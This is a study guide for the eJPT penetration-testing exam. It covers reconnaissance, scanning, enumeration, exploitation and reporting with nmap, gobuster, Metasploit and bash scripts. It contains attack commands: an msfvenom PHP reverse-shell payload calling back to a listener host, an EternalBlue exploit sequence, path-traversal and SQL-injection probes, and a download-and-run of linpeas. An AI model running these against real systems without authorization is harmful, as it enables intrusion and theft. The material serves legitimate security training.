# 🔧 eJPT Methodology - Complete Penetration Testing Framework

A systematic approach to penetration testing specifically designed for eJPT v2 exam success, covering the complete security assessment lifecycle from reconnaissance to reporting with practical examples and real-world scenarios.

**Location:** `01-theory-foundations/ejpt-methodology.md`

## 📋 Table of Contents
1. [Introduction to eJPT Methodology](#introduction-to-ejpt-methodology)
2. [Core Methodology Overview](#core-methodology-overview)
3. [Phase 1: Information Gathering](#phase-1-information-gathering)
4. [Phase 2: Host Discovery](#phase-2-host-discovery)
5. [Phase 3: Port & Service Enumeration](#phase-3-port-service-enumeration)
6. [Phase 4: Vulnerability Assessment](#phase-4-vulnerability-assessment)
7. [Phase 5: Exploitation](#phase-5-exploitation)
8. [Phase 6: Reporting](#phase-6-reporting)
9. [eJPT Requirements](#ejpt-requirements)
10. [Practical Examples](#practical-examples)

---

## 🎯 Introduction to eJPT Methodology

The **eJPT (eLearnSecurity Junior Penetration Tester)** methodology is a structured approach to penetration testing that follows industry-standard practices while being specifically tailored for entry-level security professionals. This methodology emphasizes **hands-on practical skills** over theoretical knowledge and mirrors real-world penetration testing scenarios.

### Why eJPT Methodology is Important for Ethical Hacking

- **Systematic Approach**: Following a logical sequence of testing phases ensures comprehensive coverage and reduces the risk of missing critical vulnerabilities
- **Documentation Focus**: Maintaining detailed records throughout the assessment is essential for both exam success and real-world professional practice
- **Practical Application**: Emphasizing tools and techniques used in actual penetration testing engagements rather than theoretical concepts
- **Risk-Based Testing**: Learning to prioritize high-impact vulnerabilities and attack vectors based on business impact and technical severity
- **Ethical Standards**: Adhering to legal and ethical guidelines throughout testing, which is fundamental for professional penetration testers

---

## ⚙️ Core Methodology Overview

The eJPT methodology follows a **6-phase approach** that mirrors industry standards while focusing on practical skills:

```
┌─────────────────────────────────────────────────────────────────┐
│                    eJPT Methodology Flow                        │
├─────────────────────────────────────────────────────────────────┤
│ Phase 1: Information Gathering → Phase 2: Host Discovery       │
│ Phase 3: Port & Service Enum → Phase 4: Vulnerability Assessment│
│ Phase 5: Exploitation → Phase 6: Reporting & Documentation     │
└─────────────────────────────────────────────────────────────────┘
```

### Time Distribution in eJPT Exam
| Phase | Time Allocation | Priority Level |
|-------|----------------|----------------|
| Information Gathering | 15% | ⭐⭐⭐ |
| Host Discovery | 10% | ⭐⭐⭐ |
| Port/Service Enumeration | 25% | ⭐⭐⭐ |
| Vulnerability Assessment | 20% | ⭐⭐⭐ |
| Exploitation | 25% | ⭐⭐⭐ |
| Reporting | 5% | ⭐⭐ |

---

## 🔍 Phase 1: Information Gathering & Reconnaissance

### Objectives
- Identify target scope and boundaries
- Gather publicly available information
- Map the external attack surface
- Document initial findings

### Key Activities

#### Passive Reconnaissance
```bash
# Domain enumeration
whois target.com                    # Domain registration information
dig target.com ANY                  # DNS record enumeration
nslookup -type=MX target.com        # Mail server information

# Subdomain discovery
sublist3r -d target.com             # Passive subdomain enumeration
amass enum -d target.com            # Advanced subdomain discovery

# Technology fingerprinting
whatweb target.com                  # Web technology identification
```

#### Active Reconnaissance
```bash
# DNS enumeration
dig @8.8.8.8 target.com AXFR        # Zone transfer attempt
dnsrecon -d target.com -t std       # Standard DNS enumeration

# Network discovery
nmap -sn target.com                 # Host discovery
```

### Documentation Requirements
- Target scope and IP ranges
- Domain and subdomain mapping
- Technology stack identified
- Potential attack vectors noted

---

## 🌐 Phase 2: Host Discovery & Network Mapping

### Objectives
- Identify live hosts within scope
- Map network topology
- Determine host operating systems
- Document network architecture

### Network Discovery Techniques

#### Ping Sweep Methods
```bash
# Basic ping sweep
nmap -sn 192.168.1.0/24            # Ping scan entire subnet
fping -ag 192.168.1.0/24           # Fast ping sweep

# Advanced discovery
nmap -PS22,80,443 192.168.1.0/24   # TCP SYN ping on specific ports
nmap -PA80,443 192.168.1.0/24      # TCP ACK ping
```

#### Local Network Discovery
```bash
# ARP scanning (for local networks)
arp-scan -l                        # Local network ARP scan
netdiscover -r 192.168.1.0/24     # Active host discovery
```

#### Operating System Detection
```bash
# OS fingerprinting
nmap -O 192.168.1.100              # OS detection
nmap -A 192.168.1.100              # Aggressive scan (OS + services)

# TTL analysis for OS identification
ping -c 1 192.168.1.100            # Check TTL values
# Windows: TTL=128, Linux: TTL=64, Cisco: TTL=255
```

### Host Discovery Techniques Comparison
| Technique | Speed | Stealth | Accuracy | eJPT Usage |
|-----------|-------|---------|----------|------------|
| Ping Sweep | ⭐⭐⭐ | ⭐⭐ | ⭐⭐ | High |
| ARP Scan | ⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ | High |
| TCP SYN | ⭐⭐ | ⭐⭐ | ⭐⭐⭐ | Medium |
| UDP Scan | ⭐ | ⭐⭐ | ⭐⭐ | Low |

---

## 🌐 Phase 3: Port Scanning & Service Enumeration

### Objectives
- Identify open ports and services
- Determine service versions
- Enumerate service-specific information
- Map attack surface per host

### Port Scanning Strategy

#### Comprehensive Scanning Approach
```bash
# 1. Quick port scan (top 1000 ports)
nmap -T4 -F 192.168.1.100

# 2. Full TCP port range
nmap -sS -p- 192.168.1.100

# 3. UDP service discovery
nmap -sU --top-ports 100 192.168.1.100

# 4. Service version detection
nmap -sV -p 22,80,443,445 192.168.1.100

# 5. Script scanning
nmap -sC -p 22,80,443,445 192.168.1.100
```

### Service-Specific Enumeration

#### HTTP/HTTPS Services (Ports 80, 443, 8080)
```bash
# Web server identification
whatweb http://192.168.1.100        # Technology stack identification
curl -I http://192.168.1.100        # HTTP headers analysis

# Directory enumeration
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
dirb http://192.168.1.100           # Alternative directory brute-force

# Web vulnerability scanning
nikto -h http://192.168.1.100       # Comprehensive web vulnerability scan
```

#### SSH Service (Port 22)
```bash
# SSH version and algorithms
ssh -v 192.168.1.100               # Verbose connection attempt
nmap --script ssh2-enum-algos 192.168.1.100  # Algorithm enumeration

# SSH user enumeration
nmap --script ssh-auth-methods 192.168.1.100
```

#### SMB Services (Ports 139, 445)
```bash
# SMB enumeration
smbclient -L //192.168.1.100       # List SMB shares
enum4linux 192.168.1.100           # Comprehensive SMB enumeration
smbmap -H 192.168.1.100             # SMB share mapping

# SMB null session testing
smbclient //192.168.1.100/share$ -U "" -N
```

#### FTP Service (Port 21)
```bash
# FTP banner grabbing
telnet 192.168.1.100 21            # Manual banner grab

# Anonymous FTP testing
ftp 192.168.1.100                  # Interactive FTP client
# Login: anonymous / anonymous

# FTP enumeration with nmap
nmap --script ftp-* 192.168.1.100  # All FTP scripts
```

---

## 🧪 Phase 4: Vulnerability Assessment

### Objectives
- Identify potential security vulnerabilities
- Assess vulnerability severity and impact
- Prioritize vulnerabilities for exploitation
- Document findings with evidence

### Automated Vulnerability Scanning

#### Nmap Vulnerability Scripts
```bash
# Comprehensive vulnerability scanning
nmap --script vuln 192.168.1.100   # All vulnerability scripts
nmap --script "vuln and safe" 192.168.1.100  # Safe vulnerability scripts

# Service-specific vulnerability testing
nmap --script smb-vuln-* 192.168.1.100      # SMB vulnerabilities
nmap --script http-vuln-* 192.168.1.100     # HTTP vulnerabilities
```

#### Web Application Vulnerability Scanning
```bash
# Web server vulnerabilities
nikto -h http://192.168.1.100      # Comprehensive web vulnerability scan

# SSL/TLS testing
sslscan 192.168.1.100:443         # SSL/TLS configuration analysis
testssl.sh 192.168.1.100:443      # Advanced SSL testing
```

### Manual Vulnerability Testing

#### Configuration Issues
```bash
# Default credentials testing
# Common combinations: admin/admin, root/root, admin/password

# Service banner analysis
telnet 192.168.1.100 80           # HTTP banner
telnet 192.168.1.100 21           # FTP banner
```

#### Web Application Testing
```bash
# Directory traversal testing
curl "http://192.168.1.100/../../../../etc/passwd"

# Basic SQL injection testing
curl "http://192.168.1.100/login.php?id=1'"

# File upload testing
# Manual testing through web interface
```

### Vulnerability Severity Assessment
| Severity | CVSS Score | Impact | eJPT Priority | Action Required |
|----------|------------|---------|---------------|-----------------|
| Critical | 9.0-10.0 | System compromise | ⭐⭐⭐ | Immediate exploitation |
| High | 7.0-8.9 | Significant impact | ⭐⭐⭐ | Primary targets |
| Medium | 4.0-6.9 | Moderate impact | ⭐⭐ | Secondary targets |
| Low | 0.1-3.9 | Minimal impact | ⭐ | Documentation only |

---

## 🎯 Phase 5: Exploitation & Post-Exploitation

### Objectives
- Successfully exploit identified vulnerabilities
- Gain initial system access
- Escalate privileges where possible
- Maintain persistent access
- Explore lateral movement opportunities

### Initial Access Methods

#### Web Application Exploitation
```bash
# SQL injection exploitation
sqlmap -u "http://192.168.1.100/login.php?id=1" --dbs --batch

# File upload exploitation
# 1. Create malicious file
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.php

# 2. Upload via vulnerable form
# 3. Access uploaded file to trigger shell
```

#### Service Exploitation with Metasploit
```bash
# Metasploit framework usage
msfconsole
search ms17-010                    # Search for specific vulnerability
use exploit/windows/smb/ms17_010_eternalblue  # Select exploit
set RHOSTS 192.168.1.100          # Set target
set LHOST 192.168.1.50            # Set listener IP
exploit                           # Execute exploit
```

### Privilege Escalation

#### Linux Privilege Escalation
```bash
# System enumeration
uname -a                          # Kernel version
cat /etc/passwd                   # User accounts
sudo -l                           # Sudo permissions

# SUID binary enumeration
find / -perm -4000 -type f 2>/dev/null

# Automated enumeration
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

#### Windows Privilege Escalation
```bash
# System information gathering
systeminfo                       # System details
whoami /priv                     # Current privileges
net user                         # User accounts

# Service enumeration
sc query                         # Running services
wmic service list brief          # Service information
```

### Lateral Movement
```bash
# Network reconnaissance from compromised host
arp -a                           # ARP table
netstat -an                      # Network connections
route                            # Routing table

# SSH tunneling for pivoting
ssh -L 8080:internal_host:80 user@compromised_host
```

---

## 📚 Phase 6: Reporting & Documentation

### Objectives
- Document all findings comprehensively
- Provide clear remediation guidance
- Present technical and executive summaries
- Maintain evidence chain of custody

### Report Structure

#### Executive Summary
```markdown
## Executive Summary
- **Assessment Overview**: Brief description of the penetration test
- **Scope**: Systems and networks tested
- **Key Findings**: High-level summary of critical vulnerabilities
- **Risk Assessment**: Overall security posture evaluation
- **Recommendations**: Priority actions for remediation
```

#### Technical Findings Format
```markdown
## Technical Findings

### Vulnerability: [Name]
- **Severity**: Critical/High/Medium/Low
- **CVSS Score**: X.X
- **Affected Systems**: List of affected hosts
- **Description**: Detailed vulnerability description
- **Evidence**: Screenshots, command output
- **Impact**: Potential consequences
- **Remediation**: Step-by-step fix instructions
- **References**: CVE numbers, vendor advisories
```

#### Testing Methodology Documentation
```markdown
## Testing Methodology
- **Scope**: Define what was tested
- **Approach**: eJPT 6-phase methodology
- **Tools Used**: List of tools and versions
- **Timeline**: Testing phases and duration
- **Limitations**: Any constraints or scope limitations
```

---

## 🎯 eJPT Requirements

### Essential Skills for eJPT Success (Coverage Percentages)

#### Host Discovery and Network Mapping (20% exam importance)
- **Network Reconnaissance**: Understanding network topology and identifying live hosts using ping sweeps, ARP scans, and advanced discovery techniques
- **IP Range Analysis**: Ability to work with CIDR notation, subnet calculations, and systematic network enumeration
- **Tool Proficiency**: Mastery of nmap host discovery options, netdiscover, arp-scan, and manual techniques

#### Port Scanning and Service Detection (25% exam importance)
- **Comprehensive Scanning**: Full TCP and UDP port scanning with proper timing and stealth considerations
- **Service Enumeration**: Identifying services, versions, and potential entry points through banner grabbing and fingerprinting
- **Nmap Mastery**: Advanced nmap techniques including script engine usage and output formatting

#### Web Application Testing (15% exam importance)
- **Directory Enumeration**: Using tools like gobuster, dirb, and manual techniques to discover hidden content
- **Basic Vulnerability Testing**: Understanding common web vulnerabilities like SQL injection, file upload issues
- **HTTP Analysis**: Manual testing with curl, browser developer tools, and proxy tools

#### Metasploit Framework Usage (10% exam importance)
- **Console Navigation**: Efficient use of msfconsole, search capabilities, and module selection
- **Payload Generation**: Creating and deploying payloads using msfvenom for various scenarios
- **Session Management**: Handling meterpreter sessions and post-exploitation modules

### Critical Commands for eJPT Exam Success
```bash
# Essential host discovery commands
nmap -sn 192.168.1.0/24          # Ping sweep for network discovery
arp-scan -l                       # ARP scan for local network
netdiscover -r 192.168.1.0/24    # Active host discovery

# Critical port scanning techniques  
nmap -sS -p- target               # Complete TCP SYN scan
nmap -sU --top-ports 100 target  # UDP scan of common ports
nmap -sV -sC target               # Service version + default scripts

# Web application enumeration
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
whatweb http://target             # Technology fingerprinting
curl -I http://target             # HTTP header analysis

# Metasploit essentials
msfconsole                        # Start framework
search type:exploit platform:windows  # Exploit searching
use exploit/path/to/exploit       # Module selection
show payloads                     # Available payloads
```

---

## 🧪 Practical Examples

### Complete eJPT Methodology Walkthrough: Network Assessment

This example demonstrates the full methodology applied to a typical eJPT scenario where you need to assess a network range 192.168.1.0/24.

```bash
#!/bin/bash
# Complete eJPT methodology implementation script
TARGET_NETWORK="192.168.1.0/24"
REPORT_FILE="ejpt_assessment_$(date +%Y%m%d_%H%M%S).log"

echo "=== eJPT Complete Assessment Started ===" > $REPORT_FILE
echo "Target Network: $TARGET_NETWORK" >> $REPORT_FILE
echo "Assessment Date: $(date)" >> $REPORT_FILE
echo "Methodology: 6-Phase eJPT Standard" >> $REPORT_FILE
echo "" >> $REPORT_FILE

# Phase 1: Information Gathering
echo "PHASE 1: INFORMATION GATHERING" >> $REPORT_FILE
echo "==============================" >> $REPORT_FILE
echo "Performing passive reconnaissance..." >> $REPORT_FILE

# Network range analysis
echo "Network Range Analysis:" >> $REPORT_FILE
ipcalc $TARGET_NETWORK >> $REPORT_FILE
echo "" >> $REPORT_FILE

# Phase 2: Host Discovery  
echo "PHASE 2: HOST DISCOVERY" >> $REPORT_FILE
echo "======================" >> $REPORT_FILE
echo "Discovering live hosts in $TARGET_NETWORK..." >> $REPORT_FILE

# Ping sweep
nmap -sn $TARGET_NETWORK | grep "Nmap scan report" > live_hosts.txt
LIVE_COUNT=$(cat live_hosts.txt | wc -l)
echo "Live hosts discovered: $LIVE_COUNT" >> $REPORT_FILE
cat live_hosts.txt >> $REPORT_FILE
echo "" >> $REPORT_FILE

# Phase 3: Port Scanning & Service Enumeration
echo "PHASE 3: PORT SCANNING & SERVICE ENUMERATION" >> $REPORT_FILE
echo "===========================================" >> $REPORT_FILE

# Extract IP addresses for detailed scanning
grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' live_hosts.txt > target_ips.txt

for ip in $(cat target_ips.txt); do
    echo "Scanning $ip..." >> $REPORT_FILE
    echo "--- TCP Port Scan ---" >> $REPORT_FILE
    nmap -sS -T4 -p 1-1000 $ip >> $REPORT_FILE
    
    echo "--- Service Version Detection ---" >> $REPORT_FILE  
    nmap -sV -T4 -p 1-1000 $ip >> $REPORT_FILE
    
    echo "--- Default Script Scan ---" >> $REPORT_FILE
    nmap -sC -T4 -p 1-1000 $ip >> $REPORT_FILE
    echo "" >> $REPORT_FILE
done

# Phase 4: Vulnerability Assessment
echo "PHASE 4: VULNERABILITY ASSESSMENT" >> $REPORT_FILE
echo "=================================" >> $REPORT_FILE

for ip in $(cat target_ips.txt); do
    echo "Vulnerability scanning $ip..." >> $REPORT_FILE
    nmap --script "vuln and safe" $ip >> $REPORT_FILE
    echo "" >> $REPORT_FILE
done

# Phase 5: Exploitation Preparation
echo "PHASE 5: EXPLOITATION PREPARATION" >> $REPORT_FILE
echo "=================================" >> $REPORT_FILE
echo "Identifying potential exploitation targets..." >> $REPORT_FILE

# Check for common vulnerable services
echo "Checking for common vulnerable services:" >> $REPORT_FILE
for ip in $(cat target_ips.txt); do
    echo "Target: $ip" >> $REPORT_FILE
    
    # Check for SMB
    if nmap -p 445 $ip | grep -q "445/tcp open"; then
        echo "  - SMB service detected - checking for vulnerabilities" >> $REPORT_FILE
        nmap --script smb-vuln-ms17-010 $ip >> $REPORT_FILE
    fi
    
    # Check for web services
    if nmap -p 80,443,8080 $ip | grep -q "open"; then
        echo "  - Web service detected - performing basic enumeration" >> $REPORT_FILE
        whatweb http://$ip >> $REPORT_FILE
    fi
    
    # Check for FTP
    if nmap -p 21 $ip | grep -q "21/tcp open"; then
        echo "  - FTP service detected - checking for anonymous access" >> $REPORT_FILE
        nmap --script ftp-anon $ip >> $REPORT_FILE
    fi
done

# Phase 6: Documentation Summary
echo "PHASE 6: ASSESSMENT SUMMARY" >> $REPORT_FILE
echo "===========================" >> $REPORT_FILE
echo "Assessment completed on $(date)" >> $REPORT_FILE
echo "Total hosts discovered: $LIVE_COUNT" >> $REPORT_FILE
echo "Detailed findings documented above" >> $REPORT_FILE

echo "Assessment complete. Report saved to: $REPORT_FILE"
```

### Web Application Testing Example

This example shows how to apply eJPT methodology specifically to web application assessment:

```bash
#!/bin/bash
# Web application assessment following eJPT methodology
WEB_TARGET="http://192.168.1.100"
WEB_REPORT="web_assessment_$(date +%Y%m%d_%H%M%S).log"

echo "=== Web Application Assessment ===" > $WEB_REPORT
echo "Target: $WEB_TARGET" >> $WEB_REPORT
echo "Date: $(date)" >> $WEB_REPORT
echo "" >> $WEB_REPORT

# Technology fingerprinting
echo "TECHNOLOGY IDENTIFICATION:" >> $WEB_REPORT
whatweb $WEB_TARGET >> $WEB_REPORT
echo "" >> $WEB_REPORT

# HTTP header analysis  
echo "HTTP HEADERS:" >> $WEB_REPORT
curl -I $WEB_TARGET >> $WEB_REPORT
echo "" >> $WEB_REPORT

# Directory enumeration
echo "DIRECTORY ENUMERATION:" >> $WEB_REPORT
gobuster dir -u $WEB_TARGET -w /usr/share/wordlists/dirb/common.txt >> $WEB_REPORT
echo "" >> $WEB_REPORT

# Basic vulnerability scanning
echo "VULNERABILITY SCAN:" >> $WEB_REPORT
nikto -h $WEB_TARGET >> $WEB_REPORT
echo "" >> $WEB_REPORT

# Check for common files
echo "COMMON FILES CHECK:" >> $WEB_REPORT
for file in robots.txt sitemap.xml .htaccess admin phpinfo.php; do
    response=$(curl -s -o /dev/null -w "%{http_code}" $WEB_TARGET/$file)
    echo "$file: HTTP $response" >> $WEB_REPORT
done

echo "Web assessment complete. Report: $WEB_REPORT"
```

---

## ⚠️ Common Issues & Troubleshooting

### Network Connectivity Problems
**Issue**: Cannot reach target hosts or services appear filtered
**Solutions**:
```bash
# Test basic connectivity
ping -c 1 8.8.8.8                # Verify internet access
ping -c 1 192.168.1.1            # Test gateway connectivity
traceroute target_ip             # Check network path

# Verify network configuration
ip addr show                     # Check interface configuration
route -n                         # Examine routing table
```

### Nmap Scanning Issues  
**Issue**: Scans running slowly or returning incomplete results
**Solutions**:
```bash
# Timing optimization
nmap -T4 target                  # Faster timing template
nmap -T2 target                  # Slower for unreliable networks

# Permission problems
sudo nmap -sS target             # SYN scan requires root
nmap -sT target                  # Connect scan for non-root users

# Firewall evasion
nmap -f target                   # Fragment packets
nmap --source-port 53 target    # Use common source port
```

### Metasploit Framework Problems
**Issue**: Database errors or slow module loading
**Solutions**:
```bash
# Database maintenance
msfdb reinit                     # Reinitialize database
msfdb start                      # Ensure database is running

# Performance optimization
db_rebuild_cache                 # Rebuild module cache
reload_all                       # Reload all modules
```

---

## 📚 Quick Reference

### Essential eJPT Commands
```bash
# Host discovery fundamentals
nmap -sn 192.168.1.0/24         # Network ping sweep
arp-scan -l                      # Local ARP discovery
netdiscover -r 192.168.1.0/24   # Active discovery

# Port scanning essentials
nmap -sS -p- target              # Full TCP SYN scan
nmap -sU --top-ports 100 target # Common UDP ports
nmap -sV -sC target              # Version + scripts

# Service enumeration
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
enum4linux target               # SMB enumeration
whatweb http://target            # Web technology ID

# Exploitation framework
msfconsole                       # Start Metasploit
search platform:windows         # Search exploits
use exploit/windows/smb/ms17_010_eternalblue  # Select exploit
```

### Memory Tips for eJPT Success
- **PPSVE**: **P**ing sweep, **P**ort scan, **S**ervice enum, **V**uln assess, **E**xploit
- **Nmap Trinity**: `-sS` (SYN), `-sV` (Version), `-sC` (Scripts) - the three most important nmap flags
- **Web App Basics**: Always check robots.txt, run gobuster, test for SQL injection
- **Metasploit Flow**: `search` → `use` → `set options` → `exploit`

---

**Remember**: The eJPT methodology is about practical application and systematic approach. Focus on hands-on practice with the core tools (nmap, gobuster, Metasploit) and maintain detailed documentation throughout your assessment. Success comes from following the methodology consistently and adapting to different network environments while maintaining ethical standards.
